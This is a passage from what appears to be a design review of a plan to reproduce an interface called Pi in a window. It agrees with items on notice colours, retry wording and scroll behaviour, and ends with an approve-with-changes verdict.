- **D8** — Agree. Named notices with split tones read right, and the notice yellow sharing the heading yellow is Pi's own collision, correctly carried. One copy nit: "again in 2s" reads stale as transcript history once the retry resolved; "retrying in 2s" survives rereading.
- **D9** — Agree with finding 8's conditions: instant scroll stated, the button on a raised ground, 24 px tuned at the route.

**Verdict**

Approve with the changes above — the color fidelity is thorough and honest, but the two unnamed departures (the tool fold, the capped result) and the fold's motion are where a window will stop feeling like Pi even with every hex correct, and all eight fixes are plan-level sentences, not new scope.

